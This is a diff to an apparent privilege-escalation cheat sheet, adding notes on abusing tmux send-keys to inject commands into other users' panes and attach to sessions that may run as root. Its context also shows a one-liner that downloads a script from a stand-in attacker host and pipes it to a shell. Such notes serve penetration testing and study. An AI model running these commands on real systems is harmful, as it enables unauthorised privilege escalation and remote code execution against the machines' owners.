@@ -558,6 +558,17 @@ EXPLOITING SUID EXECUTABLES
 find / -perm -u=s -type f 2>/dev/null
 wget http://attacker.dom/file.sh -O- | sh
 	-downloaded exec (in memory)
+	
+TMUX Send-Keys abuse
+tmux send-keys -t $pane 'C-c'
+	--send SIGINT to process running in another tmux pane
+for pane in `tmux list-panes | grep -Po '^\d'`; do tmux send-keys -t $pane 'C-c' && tmux send-keys -t $pane 'whoami'; done
+	--test all panes for shell user
+tmux send-keys -t $pane 'sudo whoami'
+	--try running a task as sudoer on another pane
+tmux attach -t 0
+tmux attach -t session-name
+	--try attaching to another active tmux session potentially running as root
 
 
 PATH=.:${PATH}
